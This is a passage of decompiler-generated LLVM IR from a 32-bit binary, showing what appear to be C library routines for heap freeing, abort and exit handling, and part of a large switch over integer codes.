  %v2_805128d = add i32 %v1_805128d, 8
  %v3_805128d = inttoptr i32 %v2_805128d to i32*
  store i32 %v0_805128d, i32* %v3_805128d, align 4
  %v0_8051297.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051290

dec_label_pc_8051290:                             ; preds = %dec_label_pc_8051257, %dec_label_pc_8051288
  %v1_80512a3 = phi i32 [ %v2_805125a, %dec_label_pc_8051257 ], [ %v0_8051297.pre, %dec_label_pc_8051288 ]
  %v1_8051294 = and i32 %v3_8051262, -4
  store i32 %v1_8051294, i32* @ebp, align 4
  %v1_8051297 = load i32, i32* @global_var_805334c.33, align 4
  %v12_8051297 = icmp eq i32 %v1_80512a3, %v1_8051297
  br i1 %v12_8051297, label %dec_label_pc_80512f1, label %dec_label_pc_805129f

dec_label_pc_805129f:                             ; preds = %dec_label_pc_8051290
  %v2_805129f = add i32 %v1_80512a3, 4
  %v3_805129f = add i32 %v2_805129f, %v1_8051294
  %v4_805129f = inttoptr i32 %v3_805129f to i32*
  %v5_805129f = load i32, i32* %v4_805129f, align 4
  store i32 %v5_805129f, i32* %eax.global-to-local, align 4
  %v3_80512a3 = inttoptr i32 %v2_805129f to i32*
  store i32 %v1_8051294, i32* %v3_80512a3, align 4
  %v0_80512a6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80512a6 = urem i32 %v0_80512a6, 2
  %v2_80512a6 = icmp eq i32 %v1_80512a6, 0
  store i32 %v1_80512a6, i32* %eax.global-to-local, align 4
  %v1_80512ab = icmp eq i1 %v2_80512a6, false
  br i1 %v1_80512ab, label %dec_label_pc_80512cc, label %dec_label_pc_80512ad

dec_label_pc_80512ad:                             ; preds = %dec_label_pc_805129f
  %v0_80512ad = load i32, i32* @esi, align 4
  %v1_80512ad = add i32 %v0_80512ad, 8
  %v2_80512ad = inttoptr i32 %v1_80512ad to i32*
  %v3_80512ad = load i32, i32* %v2_80512ad, align 4
  store i32 %v3_80512ad, i32* @edx, align 4
  %v1_80512b0 = add i32 %v0_80512ad, 12
  %v2_80512b0 = inttoptr i32 %v1_80512b0 to i32*
  %v3_80512b0 = load i32, i32* %v2_80512b0, align 4
  store i32 %v3_80512b0, i32* %eax.global-to-local, align 4
  %v1_80512b3 = add i32 %v3_80512ad, 12
  %v2_80512b3 = inttoptr i32 %v1_80512b3 to i32*
  %v3_80512b3 = load i32, i32* %v2_80512b3, align 4
  store i32 %v3_80512b3, i32* @edi, align 4
  %v12_80512b6 = icmp eq i32 %v3_80512b3, %v0_80512ad
  %v1_80512b8 = icmp eq i1 %v12_80512b6, false
  br i1 %v1_80512b8, label %dec_label_pc_80512bf, label %dec_label_pc_80512ba

dec_label_pc_80512ba:                             ; preds = %dec_label_pc_80512ad
  %v1_80512ba = add i32 %v3_80512b0, 8
  %v2_80512ba = inttoptr i32 %v1_80512ba to i32*
  %v3_80512ba = load i32, i32* %v2_80512ba, align 4
  %v15_80512ba = icmp eq i32 %v3_80512ba, %v3_80512b3
  br i1 %v15_80512ba, label %dec_label_pc_80512c4, label %dec_label_pc_80512bf

dec_label_pc_80512bf:                             ; preds = %dec_label_pc_80512ba, %dec_label_pc_80512ad, %dec_label_pc_8051283, %dec_label_pc_805126f
  %v0_80512bf = call i32 @function_805137f()
  store i32 %v0_80512bf, i32* %eax.global-to-local, align 4
  %v1_80512c4.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80512c4

dec_label_pc_80512c4:                             ; preds = %dec_label_pc_80512ba, %dec_label_pc_80512bf
  %v1_80512c4 = phi i32 [ %v3_80512ad, %dec_label_pc_80512ba ], [ %v1_80512c4.pre, %dec_label_pc_80512bf ]
  %v0_80512c4 = phi i32 [ %v3_80512b0, %dec_label_pc_80512ba ], [ %v0_80512bf, %dec_label_pc_80512bf ]
  %v2_80512c4 = add i32 %v1_80512c4, 12
  %v3_80512c4 = inttoptr i32 %v2_80512c4 to i32*
  store i32 %v0_80512c4, i32* %v3_80512c4, align 4
  %v0_80512c7 = load i32, i32* @edx, align 4
  %v1_80512c7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80512c7 = add i32 %v1_80512c7, 8
  %v3_80512c7 = inttoptr i32 %v2_80512c7 to i32*
  store i32 %v0_80512c7, i32* %v3_80512c7, align 4
  %v0_80512ca = load i32, i32* @ebx, align 4
  %v1_80512ca = load i32, i32* @ebp, align 4
  %v2_80512ca = add i32 %v1_80512ca, %v0_80512ca
  store i32 %v2_80512ca, i32* @ebx, align 4
  br label %dec_label_pc_80512cc

dec_label_pc_80512cc:                             ; preds = %dec_label_pc_805129f, %dec_label_pc_80512c4
  %v0_80512cc = load i32, i32* @global_var_805335c.51, align 4
  store i32 %v0_80512cc, i32* %eax.global-to-local, align 4
  %v0_80512d1 = load i32, i32* @ecx, align 4
  %v1_80512d1 = add i32 %v0_80512d1, 12
  %v2_80512d1 = inttoptr i32 %v1_80512d1 to i32*
  store i32 ptrtoint (i32* @global_var_8053354.35 to i32), i32* %v2_80512d1, align 4
  %v0_80512d8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80512d8 = load i32, i32* @ecx, align 4
  %v2_80512d8 = add i32 %v1_80512d8, 8
  %v3_80512d8 = inttoptr i32 %v2_80512d8 to i32*
  store i32 %v0_80512d8, i32* %v3_80512d8, align 4
  %v0_80512db = load i32, i32* @ebx, align 4
  %v1_80512db = load i32, i32* @ecx, align 4
  %v3_80512db = add i32 %v1_80512db, %v0_80512db
  %v4_80512db = inttoptr i32 %v3_80512db to i32*
  store i32 %v0_80512db, i32* %v4_80512db, align 4
  %v0_80512de = load i32, i32* @ecx, align 4
  %v1_80512de = load i32, i32* %eax.global-to-local, align 4
  %v2_80512de = add i32 %v1_80512de, 12
  %v3_80512de = inttoptr i32 %v2_80512de to i32*
  store i32 %v0_80512de, i32* %v3_80512de, align 4
  %v0_80512e1 = load i32, i32* @ebx, align 4
  %v1_80512e3 = or i32 %v0_80512e1, 1
  store i32 %v1_80512e3, i32* %eax.global-to-local, align 4
  %v0_80512e6 = load i32, i32* @ecx, align 4
  store i32 %v0_80512e6, i32* @global_var_805335c.51, align 4
  %v2_80512ec = add i32 %v0_80512e6, 4
  %v3_80512ec = inttoptr i32 %v2_80512ec to i32*
  store i32 %v1_80512e3, i32* %v3_80512ec, align 4
  br label %dec_label_pc_8051301

dec_label_pc_80512f1:                             ; preds = %dec_label_pc_8051290
  %v0_80512f1 = load i32, i32* @ebx, align 4
  %v2_80512f1 = add i32 %v0_80512f1, %v1_8051294
  store i32 %v2_80512f1, i32* @ebx, align 4
  %v1_80512f5 = or i32 %v2_80512f1, 1
  store i32 %v1_80512f5, i32* %eax.global-to-local, align 4
  %v1_80512f8 = load i32, i32* @ecx, align 4
  %v2_80512f8 = add i32 %v1_80512f8, 4
  %v3_80512f8 = inttoptr i32 %v2_80512f8 to i32*
  store i32 %v1_80512f5, i32* %v3_80512f8, align 4
  %v0_80512fb = load i32, i32* @ecx, align 4
  store i32 %v0_80512fb, i32* @global_var_805334c.33, align 4
  br label %dec_label_pc_8051301

dec_label_pc_8051301:                             ; preds = %dec_label_pc_80512cc, %dec_label_pc_80512f1
  %v0_8051301 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8051301, 131072
  br i1 %tmp21, label %dec_label_pc_8051366, label %dec_label_pc_8051309

dec_label_pc_8051309:                             ; preds = %dec_label_pc_8051301
  %v0_8051309 = load i8, i8* @global_var_8053320.32, align 32
  %v1_8051309 = and i8 %v0_8051309, 2
  %v2_8051309 = icmp eq i8 %v1_8051309, 0
  br i1 %v2_8051309, label %dec_label_pc_8051322, label %dec_label_pc_8051312

dec_label_pc_8051312:                             ; preds = %dec_label_pc_8051309
  %v2_805131a = call i32 @function_805103b(i32* bitcast (i8* @global_var_8053320.32 to i32*))
  store i32 %v2_805131a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051322

dec_label_pc_8051322:                             ; preds = %dec_label_pc_8051309, %dec_label_pc_8051312
  %v0_8051322 = load i32, i32* @global_var_805334c.33, align 4
  store i32 %v0_8051322, i32* %eax.global-to-local, align 4
  %v1_8051327 = add i32 %v0_8051322, 4
  %v2_8051327 = inttoptr i32 %v1_8051327 to i32*
  %v3_8051327 = load i32, i32* %v2_8051327, align 4
  %v1_805132a = and i32 %v3_8051327, -4
  store i32 %v1_805132a, i32* %eax.global-to-local, align 4
  %v1_805132d = load i32, i32* @global_var_8053664.49, align 4
  %v7_805132d = icmp ult i32 %v1_805132a, %v1_805132d
  br i1 %v7_805132d, label %dec_label_pc_8051366, label %dec_label_pc_8051335

dec_label_pc_8051335:                             ; preds = %dec_label_pc_8051322
  store i32 ptrtoint (i8* @global_var_8053320.32 to i32), i32* @edx, align 4
  %v0_805133a = load i32, i32* @global_var_8053668.47, align 8
  store i32 %v0_805133a, i32* @eax, align 4
  %v0_805133f = call i32 @function_8050fae()
  store i32 %v0_805133f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051366

dec_label_pc_8051346:                             ; preds = %dec_label_pc_805124e
  %v2_8051346 = inttoptr i32 %v1_8051217 to i32*
  %v3_8051346 = load i32, i32* %v2_8051346, align 4
  %v0_8051349 = load i32, i32* @global_var_8053670.40, align 16
  %v1_8051349 = add i32 %v0_8051349, -1
  store i32 %v1_8051349, i32* @global_var_8053670.40, align 16
  %v2_805134f = add i32 %v3_8051346, %v1_8051227
  store i32 %v2_805134f, i32* %eax.global-to-local, align 4
  %v2_8051352 = sub i32 %v1_8051217, %v3_8051346
  %v0_8051358 = load i32, i32* @global_var_8053684.43, align 4
  %v2_8051358 = sub i32 %v0_8051358, %v2_805134f
  store i32 %v2_8051358, i32* @global_var_8053684.43, align 4
  %v4_805135e = inttoptr i32 %v2_8051352 to i32*
  %v5_805135e = call i32 @function_80520ad(i32* %v4_805135e, i32 %v2_805134f, i32 %v1_8051227, i32 %v1_8051227)
  store i32 %v5_805135e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051366

dec_label_pc_8051366:                             ; preds = %dec_label_pc_8051322, %dec_label_pc_8051301, %dec_label_pc_8051335, %dec_label_pc_805122e, %dec_label_pc_8051346
  store i32 %v2_8051201, i32* @eax, align 4
  %v2_805136f = call i32 @function_805194a(i32 %v2_8051201, i32 1)
  store i32 %v2_805136f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051377

dec_label_pc_8051377:                             ; preds = %dec_label_pc_80511e3, %dec_label_pc_8051366
  %.0 = phi i32 [ undef, %dec_label_pc_80511e3 ], [ %v2_805136f, %dec_label_pc_8051366 ]
  store i32 %v0_80511e6, i32* @ebx, align 4
  store i32 %v0_80511e5, i32* @esi, align 4
  store i32 %v0_80511e4, i32* @edi, align 4
  store i32 %v0_80511e3, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8051346, { 1, 0 }
  uselistorder i32 %v0_80512db, { 1, 0 }
  uselistorder i32 %v1_80512a6, { 1, 0 }
  uselistorder i32 %v2_805129f, { 1, 0 }
  uselistorder i32 %v1_8051294, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80512a3, { 1, 0 }
  uselistorder i32 %v1_8051227, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8051222, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8051217, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 (i32*)* @function_805103b, { 3, 0, 1, 2 }
  uselistorder i32* bitcast (i8* @global_var_8053320.32 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8053354.35 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805334c.33, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_8053320.32 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8053320.32, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805303c.31 to i32), { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8051377, { 1, 0 }
  uselistorder label %dec_label_pc_8051366, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8051322, { 1, 0 }
  uselistorder label %dec_label_pc_8051301, { 1, 0 }
  uselistorder label %dec_label_pc_80512cc, { 1, 0 }
  uselistorder label %dec_label_pc_80512c4, { 1, 0 }
  uselistorder label %dec_label_pc_8051290, { 1, 0 }
}

define i32 @function_805137f() local_unnamed_addr {
dec_label_pc_805139a.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_805138b = call i32 @function_8051947(i32 ptrtoint (i32* @global_var_8053054.52 to i32))
  %v12_8051395 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805139a48 = add i32 %v12_8051395, 276
  %v5_805139a49 = inttoptr i32 %v4_805139a48 to i32*
  store i32 0, i32* %v5_805139a49, align 4
  %v0_80513a550 = load i32, i32* %eax.global-to-local, align 4
  %v1_80513a551 = add i32 %v0_80513a550, -1
  %v9_80513a552 = icmp slt i32 %v1_80513a551, 0
  store i32 %v1_80513a551, i32* %eax.global-to-local, align 4
  %v1_80513a653 = icmp eq i1 %v9_80513a552, false
  br i1 %v1_80513a653, label %dec_label_pc_805139a.dec_label_pc_805139a_crit_edge, label %dec_label_pc_80513a8

dec_label_pc_805139a.dec_label_pc_805139a_crit_edge: ; preds = %dec_label_pc_805139a.lr.ph, %dec_label_pc_805139a.dec_label_pc_805139a_crit_edge
  %v1_80513a554 = phi i32 [ %v1_80513a5, %dec_label_pc_805139a.dec_label_pc_805139a_crit_edge ], [ %v1_80513a551, %dec_label_pc_805139a.lr.ph ]
  %v0_805139a.pre = load i32, i32* @esp, align 4
  %v2_805139a = mul i32 %v1_80513a554, 4
  %v3_805139a = add i32 %v0_805139a.pre, 152
  %v4_805139a = add i32 %v3_805139a, %v2_805139a
  %v5_805139a = inttoptr i32 %v4_805139a to i32*
  store i32 0, i32* %v5_805139a, align 4
  %v0_80513a5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80513a5 = add i32 %v0_80513a5, -1
  %v9_80513a5 = icmp slt i32 %v1_80513a5, 0
  store i32 %v1_80513a5, i32* %eax.global-to-local, align 4
  %v1_80513a6 = icmp eq i1 %v9_80513a5, false
  br i1 %v1_80513a6, label %dec_label_pc_805139a.dec_label_pc_805139a_crit_edge, label %dec_label_pc_80513a8

dec_label_pc_80513a8:                             ; preds = %dec_label_pc_805139a.dec_label_pc_805139a_crit_edge, %dec_label_pc_805139a.lr.ph
  %v0_80513a8 = load i32, i32* @ebx, align 4
  %v2_80513ac = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_80513ac, i32* @ebx, align 4
  %v4_80513b4 = call i32 @function_80503d8(i32 %v2_80513ac, i32 6, i32 %v0_80513a8, i32 %v0_80513a8)
  store i32 %v4_80513b4, i32* %eax.global-to-local, align 4
  %v1_80513bc = icmp eq i32 %v4_80513b4, 0
  %v1_80513be = icmp eq i1 %v1_80513bc, false
  br i1 %v1_80513be, label %dec_label_pc_80513ce, label %dec_label_pc_80513c0

dec_label_pc_80513c0:                             ; preds = %dec_label_pc_80513a8
  %v3_80513c6 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_80513c6 = call i32 @function_804fd1f(i32 1, %_TYPEDEF_sigset_t* %v3_80513c6, i32 0)
  store i32 %v4_80513c6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513ce

dec_label_pc_80513ce:                             ; preds = %dec_label_pc_80513a8, %dec_label_pc_80513c0
  %v2_805140623 = phi i32 [ %v4_80513b4, %dec_label_pc_80513a8 ], [ %v4_80513c6, %dec_label_pc_80513c0 ]
  %v0_80513ce = load i8, i8* @global_var_8053134.53, align 4
  %v1_80513ce = icmp eq i8 %v0_80513ce, 0
  %v1_80513d5 = icmp eq i1 %v1_80513ce, false
  br i1 %v1_80513d5, label %dec_label_pc_8051406, label %dec_label_pc_80513d7

dec_label_pc_80513d7:                             ; preds = %dec_label_pc_80513ce
  store i8 1, i8* @global_var_8053134.53, align 4
  br label %dec_label_pc_80513de

dec_label_pc_80513de:                             ; preds = %dec_label_pc_8051445, %dec_label_pc_80513d7
  %v1_80513e6 = call i32 @function_8051947(i32 ptrtoint (i32* @global_var_8053054.52 to i32))
  store i32 %v1_80513e6, i32* %eax.global-to-local, align 4
  %v1_80513f2 = call i32 @function_80522c5(i32 6)
  store i32 %v1_80513f2, i32* %eax.global-to-local, align 4
  %v1_80513fe = call i32 @function_8051947(i32 ptrtoint (i32* @global_var_8053054.52 to i32))
  store i32 %v1_80513fe, i32* %eax.global-to-local, align 4
  %v0_8051406.pre = load i8, i8* @global_var_8053134.53, align 4
  br label %dec_label_pc_8051406

dec_label_pc_8051406:                             ; preds = %dec_label_pc_80513ce, %dec_label_pc_80513de
  %v2_8051406 = phi i32 [ %v2_805140623, %dec_label_pc_80513ce ], [ %v1_80513fe, %dec_label_pc_80513de ]
  %v0_8051406 = phi i8 [ %v0_80513ce, %dec_label_pc_80513ce ], [ %v0_8051406.pre, %dec_label_pc_80513de ]
  %v1_8051406 = zext i8 %v0_8051406 to i32
  %v3_8051406 = and i32 %v2_8051406, -256
  %v4_8051406 = or i32 %v1_8051406, %v3_8051406
  store i32 %v4_8051406, i32* %eax.global-to-local, align 4
  %v10_805140b = icmp eq i8 %v0_8051406, 1
  %v1_805140d = icmp eq i1 %v10_805140b, false
  br i1 %v1_805140d, label %dec_label_pc_8051467, label %dec_label_pc_805143a.lr.ph

dec_label_pc_805143a.lr.ph:                       ; preds = %dec_label_pc_8051406
  store i8 2, i8* @global_var_8053134.53, align 4
  %v2_805141e = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_805141e, i32* %eax.global-to-local, align 4
  %v3_8051423 = bitcast i32* %stack_var_-272 to i8*
  %v4_8051423 = call i32 @function_805003c(i8* %v3_8051423, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805143a40 = add i32 %v12_8051395, 140
  %v5_805143a41 = inttoptr i32 %v4_805143a40 to i32*
  store i32 -1, i32* %v5_805143a41, align 4
  %v0_805144242 = load i32, i32* %eax.global-to-local, align 4
  %v1_805144243 = add i32 %v0_805144242, -1
  %v9_805144244 = icmp slt i32 %v1_805144243, 0
  store i32 %v1_805144243, i32* %eax.global-to-local, align 4
  %v1_805144345 = icmp eq i1 %v9_805144244, false
  br i1 %v1_805144345, label %dec_label_pc_805143a.dec_label_pc_805143a_crit_edge, label %dec_label_pc_8051445

dec_label_pc_805143a.dec_label_pc_805143a_crit_edge: ; preds = %dec_label_pc_805143a.lr.ph, %dec_label_pc_805143a.dec_label_pc_805143a_crit_edge
  %v1_805144246 = phi i32 [ %v1_8051442, %dec_label_pc_805143a.dec_label_pc_805143a_crit_edge ], [ %v1_805144243, %dec_label_pc_805143a.lr.ph ]
  %v0_805143a.pre = load i32, i32* @esp, align 4
  %v2_805143a = mul i32 %v1_805144246, 4
  %v3_805143a = add i32 %v0_805143a.pre, 16
  %v4_805143a = add i32 %v3_805143a, %v2_805143a
  %v5_805143a = inttoptr i32 %v4_805143a to i32*
  store i32 -1, i32* %v5_805143a, align 4
  %v0_8051442 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051442 = add i32 %v0_8051442, -1
  %v9_8051442 = icmp slt i32 %v1_8051442, 0
  store i32 %v1_8051442, i32* %eax.global-to-local, align 4
  %v1_8051443 = icmp eq i1 %v9_8051442, false
  br i1 %v1_8051443, label %dec_label_pc_805143a.dec_label_pc_805143a_crit_edge, label %dec_label_pc_8051445

dec_label_pc_8051445:                             ; preds = %dec_label_pc_805143a.dec_label_pc_805143a_crit_edge, %dec_label_pc_805143a.lr.ph
  store i32 %v2_805141e, i32* %eax.global-to-local, align 4
  %v4_805145a = call i32 @function_8051b87(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_805145a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513de

dec_label_pc_8051467:                             ; preds = %dec_label_pc_8051406
  %v10_8051467 = icmp eq i8 %v0_8051406, 2
  %v1_8051469 = icmp eq i1 %v10_8051467, false
  br i1 %v1_8051469, label %dec_label_pc_8051473, label %dec_label_pc_8051473.thread

dec_label_pc_8051473.thread:                      ; preds = %dec_label_pc_8051467
  store i8 3, i8* @global_var_8053134.53, align 4
  br label %dec_label_pc_805147c

dec_label_pc_8051473:                             ; preds = %dec_label_pc_8051467
  %v9_8051473 = icmp eq i8 %v0_8051406, 3
  %v1_805147a = icmp eq i1 %v9_8051473, false
  br i1 %v1_805147a, label %dec_label_pc_805148d, label %dec_label_pc_805147c

dec_label_pc_805147c:                             ; preds = %dec_label_pc_8051473.thread, %dec_label_pc_8051473
  store i8 4, i8* @global_var_8053134.53, align 4
  %v1_8051488 = call i32 @function_8051ce8(i32 127)
  unreachable

dec_label_pc_805148d:                             ; preds = %dec_label_pc_8051473, %dec_label_pc_805148d
  br label %dec_label_pc_805148d

; uselistorder directives
  uselistorder i32 %v1_8051442, { 2, 1, 0 }
  uselistorder i32 %v1_80513a5, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 9, 8, 0, 2, 3, 10, 11, 12, 13, 14, 15, 16, 18, 17, 1, 4, 5 }
  uselistorder i8 3, { 3, 4, 0, 1, 2 }
  uselistorder i32 (i32, i32*, i32)* @function_8051b87, { 1, 0 }
  uselistorder i8 2, { 8, 14, 11, 1, 12, 2, 3, 4, 5, 6, 9, 10, 7, 0, 13 }
  uselistorder i8* @global_var_8053134.53, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805148d, { 1, 0 }
  uselistorder label %dec_label_pc_805147c, { 1, 0 }
  uselistorder label %dec_label_pc_805143a.dec_label_pc_805143a_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8051406, { 1, 0 }
  uselistorder label %dec_label_pc_80513ce, { 1, 0 }
  uselistorder label %dec_label_pc_805139a.dec_label_pc_805139a_crit_edge, { 1, 0 }
}

define i32 @function_80515d3(i32 %arg1) local_unnamed_addr {
dec_label_pc_80515d3:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_80515e6 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80515e6, i32* @ebx, align 4
  %v2_80515eb = call i32 @function_805194a(i32 %v2_80515e6, i32 134551879)
  %v1_80515f7 = call i32 @function_8051947(i32 ptrtoint (i32* @global_var_805306c.54 to i32))
  %v0_80515fc = load i32, i32* @global_var_8053138.55, align 8
  store i32 %v0_80515fc, i32* @eax, align 4
  %v1_8051604 = icmp eq i32 %v0_80515fc, 0
  br i1 %v1_8051604, label %dec_label_pc_8051611, label %dec_label_pc_8051608

dec_label_pc_8051608:                             ; preds = %dec_label_pc_80515d3
  %v0_805160b = load i32, i32* @esi, align 4
  %v1_805160c = call i32 @unknown_0(i32 %v0_805160b)
  store i32 %v1_805160c, i32* @eax, align 4
  br label %dec_label_pc_8051611

dec_label_pc_8051611:                             ; preds = %dec_label_pc_80515d3, %dec_label_pc_8051608
  %v2_8051616 = call i32 @function_805194a(i32 %v2_80515e6, i32 1)
  %v0_805161b = call i32 @function_8051908()
  %v0_8051634 = load i32, i32* @esi, align 4
  %v1_8051635 = call i32 @function_8051ce8(i32 %v0_8051634)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_8051ce8, { 1, 0 }
  uselistorder i32 (i32)* @function_8051947, { 3, 2, 1, 0, 5, 10, 8, 7, 9, 6, 4 }
  uselistorder i32 (i32, i32)* @function_805194a, { 1, 0, 5, 4, 13, 12, 9, 8, 7, 6, 11, 10, 3, 2 }
  uselistorder label %dec_label_pc_8051611, { 1, 0 }
}

define i32 @function_80517c3(i32 %arg1) local_unnamed_addr {
dec_label_pc_80517c3:
  switch i32 %arg1, label %dec_label_pc_80517e2 [
    i32 0, label %dec_label_pc_80517f2
    i32 1, label %dec_label_pc_80518d7
    i32 2, label %dec_label_pc_80517fc
    i32 3, label %dec_label_pc_8051806
    i32 4, label %dec_label_pc_8051810
    i32 5, label %dec_label_pc_80518a6
    i32 6, label %dec_label_pc_8051818
    i32 7, label %dec_label_pc_80517d8
    i32 8, label %dec_label_pc_80517d8
    i32 9, label %dec_label_pc_80517d8
    i32 10, label %dec_label_pc_80517d8
    i32 11, label %dec_label_pc_80517d8
    i32 12, label %dec_label_pc_80517d8
    i32 13, label %dec_label_pc_80517d8
    i32 14, label %dec_label_pc_80517d8
    i32 15, label %dec_label_pc_80517d8
    i32 16, label %dec_label_pc_80517d8
    i32 17, label %dec_label_pc_80517d8
    i32 18, label %dec_label_pc_80517d8
    i32 19, label %dec_label_pc_80517d8
    i32 20, label %dec_label_pc_80517d8
    i32 21, label %dec_label_pc_80517d8
    i32 22, label %dec_label_pc_80517d8
    i32 23, label %dec_label_pc_80518d7
    i32 24, label %dec_label_pc_80518d7
    i32 25, label %dec_label_pc_80518e3
    i32 26, label %dec_label_pc_80518b4
    i32 27, label %dec_label_pc_80518d7
    i32 28, label %dec_label_pc_805182a
    i32 29, label %dec_label_pc_80518ad
    i32 30, label %dec_label_pc_8051822
    i32 31, label %dec_label_pc_80518c2
    i32 32, label %dec_label_pc_80518d7
    i32 33, label %dec_label_pc_80518d7
    i32 34, label %dec_label_pc_80518d7
    i32 35, label %dec_label_pc_80518bb
    i32 36, label %dec_label_pc_80518ea
    i32 37, label %dec_label_pc_80518f1
    i32 38, label %dec_label_pc_80518ea
    i32 39, label %dec_label_pc_8051834
    i32 40, label %dec_label_pc_80518f8
    i32 41, label %dec_label_pc_80518d7
    i32 42, label %dec_label_pc_80518c2
    i32 43, label %dec_label_pc_80518f1
    i32 44, label %dec_label_pc_80518ff
    i32 45, label %dec_label_pc_80518f1
    i32 46, label %dec_label_pc_80518ad
    i32 47, label %dec_label_pc_80518ad
    i32 48, label %dec_label_pc_80518ad
    i32 49, label %dec_label_pc_80518d7
    i32 50, label %dec_label_pc_80518d7
    i32 51, label %dec_label_pc_80518ad
    i32 52, label %dec_label_pc_80518ad
    i32 53, label %dec_label_pc_80518d7
    i32 54, label %dec_label_pc_80518d7
    i32 55, label %dec_label_pc_80518d7
    i32 56, label %dec_label_pc_80518d7
    i32 57, label %dec_label_pc_80518d7
    i32 58, label %dec_label_pc_80518d7
    i32 59, label %dec_label_pc_80518d7
    i32 60, label %dec_label_pc_80518d7
    i32 61, label %dec_label_pc_80518d7
    i32 62, label %dec_label_pc_80518d7
    i32 63, label %dec_label_pc_80518d7
    i32 64, label %dec_label_pc_80518d7
    i32 65, label %dec_label_pc_80518d7
    i32 66, label %dec_label_pc_80518d7
    i32 67, label %dec_label_pc_80517d8
    i32 68, label %dec_label_pc_80517d8
    i32 69, label %dec_label_pc_80518bb
    i32 70, label %dec_label_pc_80518bb
    i32 71, label %dec_label_pc_80518bb
    i32 72, label %dec_label_pc_80518c2
    i32 73, label %dec_label_pc_80518c9
    i32 74, label %dec_label_pc_80518d0
    i32 75, label %dec_label_pc_805183e
    i32 76, label %dec_label_pc_80518d0
    i32 77, label %dec_label_pc_80517d8
    i32 78, label %dec_label_pc_80517d8
    i32 79, label %dec_label_pc_80517d8
    i32 80, label %dec_label_pc_80517d8
    i32 81, label %dec_label_pc_80517d8
    i32 82, label %dec_label_pc_80517d8
    i32 83, label %dec_label_pc_80517d8
    i32 84, label %dec_label_pc_80517d8
    i32 85, label %dec_label_pc_80518d7
    i32 86, label %dec_label_pc_80518d7
    i32 87, label %dec_label_pc_80518b4
    i32 88, label %dec_label_pc_8051848
    i32 89, label %dec_label_pc_8051852
    i32 90, label %dec_label_pc_80518c9
    i32 91, label %dec_label_pc_80517d8
    i32 92, label %dec_label_pc_80517d8
    i32 93, label %dec_label_pc_80517d8
    i32 94, label %dec_label_pc_80517d8
    i32 95, label %dec_label_pc_80518ad
    i32 96, label %dec_label_pc_80518d7
    i32 97, label %dec_label_pc_80518d7
    i32 98, label %dec_label_pc_80517d8
    i32 99, label %dec_label_pc_80517d8
    i32 100, label %dec_label_pc_80517d8
    i32 101, label %dec_label_pc_805185c
    i32 102, label %dec_label_pc_805189f
    i32 103, label %dec_label_pc_80518dc
    i32 104, label %dec_label_pc_80518b4
    i32 105, label %dec_label_pc_8051866
    i32 106, label %dec_label_pc_80518c2
    i32 107, label %dec_label_pc_80518c2
    i32 108, label %dec_label_pc_80518a6
    i32 109, label %dec_label_pc_80518e3
    i32 110, label %dec_label_pc_80518ff
    i32 111, label %dec_label_pc_805189f
    i32 112, label %dec_label_pc_80518dc
    i32 113, label %dec_label_pc_80518ff
    i32 114, label %dec_label_pc_8051870
    i32 115, label %dec_label_pc_80518f8
    i32 116, label %dec_label_pc_80518d7
    i32 117, label %dec_label_pc_80518d7
    i32 118, label %dec_label_pc_805187a
    i32 119, label %dec_label_pc_8051884
    i32 120, label %dec_label_pc_80518f1
    i32 121, label %dec_label_pc_80518b4
    i32 122, label %dec_label_pc_80518b4
    i32 123, label %dec_label_pc_80518b4
    i32 124, label %dec_label_pc_80518b4
    i32 125, label %dec_label_pc_80517d8
